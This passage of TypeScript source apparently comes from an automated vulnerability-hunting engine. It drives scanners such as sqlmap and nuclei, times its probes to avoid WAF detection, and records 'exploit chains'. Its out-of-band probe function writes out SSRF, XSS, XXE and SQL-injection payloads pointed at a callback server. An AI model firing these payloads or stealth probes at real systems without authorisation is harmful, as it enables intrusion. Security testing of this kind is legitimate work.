          this.rlWiring.recordModelOutcome(hypothesis.modelSource ?? "default", hypothesis.vulnClass, false);
          // Record miss in ROI model so success rates decay appropriately
          this.roiModel.updateSuccessRate(hypothesis.vulnClass, false).catch(() => {});
        } else {
          hypothesis.status = "pending";
        }
      }
    }

    const pending = this.state.hypotheses.filter(h => h.status === "pending").length;
    const rejected = this.state.hypotheses.filter(h => h.status === "rejected").length;
    this.emit("hunt:update", {
      confirmed: this.state.confirmedFindings.length,
      pendingHypotheses: pending,
      rejectedHypotheses: rejected,
    });
    this.emit("hunt:ai_reasoning", {
      sessionId: this.state.sessionId,
      task: "Strategy Update",
      phase: "decision",
      summary: `Iteration ${this.state.iteration} complete. Confirmed: ${this.state.confirmedFindings.length}, Pending: ${pending}, Rejected: ${rejected}.`,
    });
  }

  // ─── Helpers ─────────────────────────────────────────────────────────────────
  private async runTool(
    toolName: string,
    url: string,
    hypothesis?: Hypothesis
  ): Promise<Record<string, unknown>> {
    const tool = this.mergedTools[toolName];
    if (!tool) return { error: "Unknown tool" };

    // Rate limiting
    const lastUsed = this.toolLastUsed.get(toolName) || 0;
    const waitTime = (tool.rateLimit * 1000) - (Date.now() - lastUsed);
    if (waitTime > 0) await new Promise(r => setTimeout(r, Math.min(waitTime, 5000)));

    // Skip if target is known hard-banned — avoid wasting tool budget on blocked requests
    try {
      const hostname = new URL(url).hostname;
      if (dynamicRateLimiter.isHardBanned(hostname)) {
        return { hardBanned: true, duration: 0, command: '' };
      }
    } catch { /* non-critical — URL may not be parseable */ }

    // Decay-aware timing: honour stealth coordinator recommendation before probing
    try {
      const domain = new URL(url).hostname;
      const vendor = (this.state as unknown as Record<string, string>).detectedWafVendor ?? 'generic';
      const status = stealthCoordinator.getStatus(this.state.sessionId, domain, vendor);
      const decayState = temporalDecay.getDecayState(this.state.sessionId, domain, vendor);
      if (decayState.recommendedWaitMs > 0) {
        logger.debug('[HunterEngine] stealth timing delay', { status, waitMs: decayState.recommendedWaitMs });
        await new Promise(r => setTimeout(r, Math.min(decayState.recommendedWaitMs, 30_000)));
      }
    } catch { /* non-critical — URL may not be parseable */ }

    const { bin, args } = tool.command(url, hypothesis ? { severity: "medium,high,critical" } : undefined);

    // Nuclei template rotation — inject previously generated custom templates
    if (toolName === "nuclei") {
      try {
        const domain = new URL(url).hostname;
        const saved = await db.select({ nucleiTemplate: findings.nucleiTemplate })
          .from(findings)
          .where(isNotNull(findings.nucleiTemplate))
          .orderBy(desc(findings.createdAt))
          .limit(10);
        const templates = saved.map(r => r.nucleiTemplate).filter(Boolean) as string[];
        if (templates.length > 0) {
          const tmplPath = join(tmpdir(), `netty-custom-${domain.replace(/\./g, "-")}-${Date.now()}.yaml`);
          await writeFile(tmplPath, templates.join("\n---\n"), "utf8");
          args.push("-t", tmplPath);
        }
      } catch { /* non-critical — continue without custom templates */ }
    }

    // Inject auth headers so tools probe authenticated surfaces
    if (this.authHeaders && Object.keys(this.authHeaders).length > 0) {
      args.push(...this.buildAuthArgs(toolName, this.authHeaders));
    }
    const cmdString = `${bin} ${args.join(" ")}`;
    const start = Date.now();

    try {
      const { stdout, stderr } = await execFileAsync(bin, args, { timeout: 60000 });
      this.toolLastUsed.set(toolName, Date.now());
      const parsed = tool.parser(stdout + stderr);
      // Feed raw output to autonomous brain — fire-and-forget so AI latency never blocks probing
      import('../lib/intelligence').then(({ getAutonomousBrain }) => {
        const brain = getAutonomousBrain();
        brain.processObservation({
          id: `obs-${Date.now()}`,
          timestamp: new Date().toISOString(),
          source: 'tool',
          type: toolName,
          rawOutput: stdout + stderr,
          missionId: this.state.sessionId,
          huntGoal: hypothesis?.vulnClass,
          target: url,
        }).then(() => {
          brain.recordActionResult(this.state.sessionId, toolName, true, `tool succeeded: ${parsed.found ? 'finding' : 'no finding'}`);
        }).catch(() => {});
      }).catch(() => {});
      return { ...parsed, duration: Date.now() - start, command: cmdString };
    } catch (err: unknown) {
      const error = err as { killed?: boolean; stdout?: string; stderr?: string; message?: string };
      try {
        const { getAutonomousBrain } = await import('../lib/intelligence');
        getAutonomousBrain().recordActionResult(this.state.sessionId, toolName, false, error.killed ? 'timeout' : (error.message || 'unknown error'));
      } catch { /* non-critical */ }
      const timedOut = error.killed === true;
      const partialOutput = (error.stdout || '') + (error.stderr || '');
      this.toolLastUsed.set(toolName, Date.now());
      if (partialOutput.trim()) {
        return { ...tool.parser(partialOutput), timedOut, duration: Date.now() - start, command: cmdString };
      }
      return { timeout: true, timedOut, duration: Date.now() - start, command: cmdString };
    }
  }

  private selectTool(vulnClass: string): string {
    const vulnToolMap: Record<string, string> = {
      xss: "dalfox",
      sqli: "sqlmap",
      ssrf: "nuclei",
      lfi: "nuclei",
      rce: "nuclei",
      ssti: "tplmap",
      auth_bypass: "jwt_tool",
      http_smuggling: "smuggler",
      idor: "curl_probe",
      misconfig: "nikto",
      hidden_endpoints: "ffuf",
      exposed_panels: "gobuster",
      security_headers: "curl_probe",
      tech_stack: "whatweb",
      open_redirect: "nuclei",
      cors: "curl_probe",
      csrf: "curl_probe",
      info_disclosure: "curl_probe",
      xxe: "nuclei",
      race_condition: "curl_probe",
      prototype_pollution: "curl_probe",
      cloud_storage_exposure: "curl_probe",
      broken_auth: "jwt_tool",
      websocket: "curl_probe",
      host_header_injection: "curl_probe",
      crlf_injection: "curl_probe",
      cookie_flags: "curl_probe",
      oauth_misconfiguration: "curl_probe",
      mass_assignment: "curl_probe",
      business_logic: "curl_probe",
      two_factor_bypass: "curl_probe",
      jwt_confusion: "jwt_tool",
      parameter_injection: "nuclei",
      hidden_params: "ffuf",
    };
    return vulnToolMap[vulnClass] || "nuclei";
  }

  private getAlternateTool(hypothesis: Hypothesis): string {
    // Rotation per vuln class — each entry is an ordered list of tool alternatives
    const TOOL_ROTATION: Record<string, string[]> = {
      sqli:             ["sqlmap", "nuclei", "curl_probe"],
      xss:              ["nuclei", "curl_probe"],
      ssrf:             ["nuclei", "curl_probe"],
      lfi:              ["nuclei", "curl_probe"],
      rce:              ["nuclei", "curl_probe"],
      cors:             ["curl_probe", "nuclei"],
      csrf:             ["curl_probe", "nuclei"],
      idor:             ["curl_probe", "nuclei"],
      info_disclosure:  ["curl_probe", "nuclei"],
      auth_bypass:      ["nuclei", "curl_probe"],
      misconfig:        ["nikto", "nuclei"],
      xxe:              ["nuclei", "curl_probe"],
      security_headers: ["curl_probe", "nuclei"],
    };
    const rotation = TOOL_ROTATION[hypothesis.vulnClass] || ["nuclei", "curl_probe"];
    const currentTool = this.selectTool(hypothesis.vulnClass);
    const currentIdx = rotation.indexOf(currentTool);
    return rotation[(currentIdx + 1) % rotation.length];
  }

  private buildAuthArgs(toolName: string, headers: Record<string, string>): string[] {
    const args: string[] = [];
    for (const [key, value] of Object.entries(headers)) {
      switch (toolName) {
        case "nuclei":
        case "ffuf":
          args.push("-H", `${key}: ${value}`);
          break;
        case "curl_probe":
          args.push("-H", `${key}: ${value}`);
          break;
        case "sqlmap":
          if (key.toLowerCase() === "cookie") {
            args.push("--cookie", value);
          } else {
            args.push("--headers", `${key}: ${value}`);
          }
          break;
        case "whatweb":
          args.push("--header", `${key}: ${value}`);
          break;
        case "gobuster":
          args.push("-H", `${key}: ${value}`);
          break;
        case "nikto":
          if (key.toLowerCase() === "cookie") {
            args.push("-c", value);
          }
          break;
      }
    }
    return args;
  }

  private async runOOBProbe(targetUrl: string, vulnClass: string): Promise<boolean> {
    try {
      const { beaconId, callbackUrl } = callbackServer.generateBeacon();

      // Inject callback URL as payload based on vuln class
      const probeUrl = (() => {
        const u = new URL(targetUrl);
        if (vulnClass === "ssrf") {
          // Append callback URL as common SSRF parameter names
          u.searchParams.set("url", callbackUrl);
          return u.toString();
        }
        if (vulnClass === "xss") {
          u.searchParams.set("q", `<img src="${callbackUrl}">`);
          return u.toString();
        }
        if (vulnClass === "xxe") {
          u.searchParams.set("xml", `<!DOCTYPE x [<!ENTITY oob SYSTEM "${callbackUrl}">]><x>&oob;</x>`);
          return u.toString();
        }
        // sqli/rce: fire a secondary DNS-style probe as a GET request
        u.searchParams.set("id", `1 OR 1=1-- ${callbackUrl}`);
        return u.toString();
      })();

      await axios.get(probeUrl, {
        headers: this.authHeaders,
        timeout: 8000,
        validateStatus: () => true,
      }).catch(() => {});

      const hit = await callbackServer.waitForHit(beaconId, 12_000);
      if (hit) {
        this.emit("hunt:oob_hit", { sessionId: this.state.sessionId, beaconId, vulnClass, targetUrl });
        logger.info("[HunterEngine] OOB callback confirmed", { beaconId, vulnClass, targetUrl });
      }
      callbackServer.cleanup(beaconId);
      return hit;
    } catch (err) {
      logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
      return false;
    }
  }

  private computeAnomalyScore(data: Record<string, unknown>): number {
    let score = 0;
    const str = JSON.stringify(data).toLowerCase();

    // High anomaly signals
    if (str.includes("error") || str.includes("exception")) score += 0.2;
    if (str.includes("stack trace") || str.includes("traceback")) score += 0.4;
    if (str.includes("sql") || str.includes("mysql") || str.includes("postgres")) score += 0.3;
    if (str.includes("version") || str.includes("v1.") || str.includes("v2.")) score += 0.1;
    if ((data.missingSecurityHeaders as string[])?.length > 2) score += 0.3;

    return Math.min(score, 1.0);
  }

  private buildContext(): string {
    return JSON.stringify({
      target: this.state.targetUrl,
      observations: this.state.observations.length,
      hypotheses: this.state.hypotheses.length,
      probes: this.state.probes.length,
      iteration: this.state.iteration,
    });
  }

  private generateDefaultHypotheses(): void {
    const defaults: Partial<Hypothesis>[] = [
      { vulnClass: "xss", confidence: 0.5, priority: 7 },
      { vulnClass: "sqli", confidence: 0.4, priority: 8 },
      { vulnClass: "security_headers", confidence: 0.6, priority: 5 },
      { vulnClass: "hidden_endpoints", confidence: 0.5, priority: 6 },
      { vulnClass: "misconfig", confidence: 0.4, priority: 5 },
    ];

    for (const d of defaults) {
      this.state.hypotheses.push({
        id: uuidv4(),
        vulnClass: d.vulnClass!,
        targetUrl: this.state.targetUrl,
        reasoning: `Default hypothesis for ${d.vulnClass} based on common vulnerability patterns`,
        confidence: d.confidence!,
        priority: d.priority!,
        evidence: [],
        status: "pending",
        createdAt: Date.now(),
      });
    }
  }

  private async updateConfidence(hypothesis: Hypothesis, probes: ProbeResult[]): Promise<number> {
    const successRate = probes.filter(p => p.success).length / Math.max(probes.length, 1);
    const baseConfidence = hypothesis.confidence;
    // Bayesian update (simplified)
    return Math.min(0.99, baseConfidence * 0.4 + successRate * 0.6);
  }

  private async buildConfirmedFinding(
    hypothesis: Hypothesis,
    probes: ProbeResult[]
  ): Promise<HypothesisConfirmed> {
    const severityMap: Record<string, string> = {
      rce: "critical", sqli: "high", xss: "medium", ssrf: "high",
      lfi: "high", idor: "medium", misconfig: "low", info_disclosure: "low",
      security_headers: "info", auth_bypass: "critical",
    };

    const cvssMap: Record<string, number> = {
      critical: 9.5, high: 7.5, medium: 5.0, low: 3.0, info: 1.0
    };

    const severity = severityMap[hypothesis.vulnClass] || "medium";
    const cvssScore = cvssMap[severity] || 5.0;
    const bestProbe = probes.sort((a, b) => Number(b.success) - Number(a.success))[0];

    return {
      hypothesis,
      proof: probes,
      severity,
      cvssScore,
      exploitPayload: bestProbe?.output?.slice(0, 500) || "",
    };
  }

  private buildReproductionSteps(confirmed: HypothesisConfirmed): string[] {
    const steps: string[] = [
      `Navigate to the target endpoint: \`${confirmed.hypothesis.targetUrl}\``,
      `Vulnerability class: \`${confirmed.hypothesis.vulnClass}\` — ${confirmed.hypothesis.reasoning}`,
    ];

    confirmed.proof.forEach((probe, i) => {
      steps.push(
        `Step ${i + 3}: Run \`${probe.tool}\` — ${probe.success ? "Evidence found" : "Probed"}. ` +
        `Output: ${probe.output.slice(0, 300)}`
      );
    });

    if (confirmed.exploitPayload) {
      steps.push(`Payload used: \`${confirmed.exploitPayload.slice(0, 500)}\``);
    }
    steps.push(
      `Expected result: ${confirmed.severity.toUpperCase()} severity (CVSS ${confirmed.cvssScore}). ` +
      `Confidence: ${Math.round(confirmed.hypothesis.confidence * 100)}%`
    );
    return steps;
  }

  private async persistFinding(confirmed: HypothesisConfirmed): Promise<void> {
    try {
      await db.insert(findings).values({
        huntSessionId: this.dbSessionId,
        campaignId: this.campaignId,
        targetId: this.targetId,
        title: `${confirmed.hypothesis.vulnClass.toUpperCase()} found at ${confirmed.hypothesis.targetUrl}`,
        vulnType: confirmed.hypothesis.vulnClass,
        severity: confirmed.severity,
        confidence: confirmed.hypothesis.confidence,
        cvssScore: confirmed.cvssScore,
        description: confirmed.hypothesis.reasoning,
        evidence: confirmed.proof as unknown as Record<string, unknown>[],
        reproductionSteps: this.buildReproductionSteps(confirmed) as unknown as Record<string, unknown>[],
        exploitPayload: confirmed.exploitPayload,
        verificationStatus: "pending",
        status: "new",
      });
      // Update ROI model with confirmed finding
      await this.roiModel.updateSuccessRate(confirmed.hypothesis.vulnClass, true);
    } catch (err) {
      logger.error("Failed to persist finding", { err });
    }
  }

  private async persistResults(): Promise<void> {
    const totalHypotheses = this.state.hypotheses.length;
    const confirmedHypotheses = this.state.hypotheses.filter(h => h.status === 'confirmed').length;
    const conversionRate = totalHypotheses > 0 ? confirmedHypotheses / totalHypotheses : 0;
    logger.info('[HunterEngine] Hunt conversion rate', {
      sessionId: this.state.sessionId,
      totalHypotheses,
      confirmedHypotheses,
      conversionRate: Math.round(conversionRate * 1000) / 1000,
    });

    try {
      await db.update(huntSessions)
        .set({
          phase: "complete",
          status: "completed",
          hypotheses: this.state.hypotheses as unknown as Record<string, unknown>[],
          observations: this.state.observations as unknown as Record<string, unknown>[],
          probes: this.state.probes as unknown as Record<string, unknown>[],
          completedAt: new Date(),
        })
        .where(eq(huntSessions.sessionUuid, this.state.sessionId));

      // Create exploit chain if multiple findings confirmed – links findings into an attack narrative
      if (this.campaignId && this.state.confirmedFindings.length >= 2) {
        const steps = this.state.confirmedFindings.map((f, i) => ({
          order: i + 1,
          vulnClass: f.hypothesis.vulnClass,
          targetUrl: f.hypothesis.targetUrl,
          severity: f.severity,
          payload: f.exploitPayload.slice(0, 200),
        }));
        const maxSeverityIdx = this.state.confirmedFindings
          .map(f => ({ critical: 4, high: 3, medium: 2, low: 1, info: 0 }[f.severity] || 0))
          .reduce((maxI, v, i, arr) => v > arr[maxI] ? i : maxI, 0);
        const topFinding = this.state.confirmedFindings[maxSeverityIdx];
        await db.insert(exploitChains).values({
          campaignId: this.campaignId,
          chainUuid: uuidv4(),
          name: `Chain: ${topFinding.hypothesis.vulnClass} → ${this.state.confirmedFindings.length} vulns`,
          steps: steps as unknown as Record<string, unknown>[],
          totalImpact: topFinding.cvssScore,
          successRate: this.state.confirmedFindings.length / Math.max(this.state.hypotheses.length, 1),
          finalObjective: `Multi-vector attack on ${this.state.targetUrl}`,
          status: "discovered",
        });
      }
    } catch (err) {
      logger.error("Failed to persist hunt results", { err });
    }
  }

  getState(): HuntState {
    return this.state;
  }
}

export default HunterEngine;
